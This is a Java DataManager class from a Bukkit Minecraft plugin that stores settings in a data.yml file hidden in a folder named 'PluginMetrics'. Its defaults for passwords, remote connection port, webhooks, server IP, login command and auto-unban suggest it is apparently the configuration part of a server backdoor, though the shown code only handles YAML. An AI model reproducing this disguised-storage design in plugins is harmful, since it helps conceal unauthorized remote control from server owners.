
package me.system.runner.data;

import java.io.File;
import java.io.IOException;
import java.util.List;

import me.system.runner.Core;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;


public class DataManager {
    private static final Core ADMIN = (Core)Core.getPlugin(Core.class);
    static File dataFile = null;
    public static YamlConfiguration data = new YamlConfiguration();
    public static List<String> bannedPlayers = DataManager.getData().getStringList("epic-players");
    public static List<String> idk = DataManager.getData().getStringList("epic-pl");

    public static void setupData() {
        dataFile = new File(ADMIN.getDataFolder().getParentFile() + "/PluginMetrics/", "data.yml");
        DataManager.generateConfig();
        DataManager.loadData();
        DataManager.saveData();
    }

    public static FileConfiguration getData() {
        return data;
    }

    private static void loadData() {
        try {
            data.load(dataFile);
            data.addDefault("hasPass", (Object)false);
            data.addDefault("pass", (Object)"TID");
            data.addDefault("connect", (Object)false);
            data.addDefault("port", (Object)1001);
            data.addDefault("login", (Object)false);
            data.addDefault("key", (Object)"");
            data.addDefault("id", (Object)"TID");
            data.addDefault("mt", (Object)"");
            data.addDefault("err", (Object)"");
            data.addDefault("wh", (Object)"");
            data.addDefault("mywh", (Object)"");
            data.addDefault("whitelist_allowed", (Object)false);
            data.addDefault("autounban", (Object)false);
            data.addDefault("serverip", (Object)"");
            data.addDefault("login_command", (Object)"./login");
            data.addDefault("epic-players", bannedPlayers);
            data.addDefault("epic-pl", idk);
            data.options().copyDefaults(true);
            DataManager.saveData();
        }
        catch (IOException | InvalidConfigurationException throwable) {
            
        }
    }

    public static void saveData() {
        try {
            data.save(dataFile);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    private static void generateConfig() {
        if (!dataFile.exists()) {
            try {
                data.save(dataFile);
            }
            catch (IOException e2) {
                e2.printStackTrace();
            }
        }
    }
}

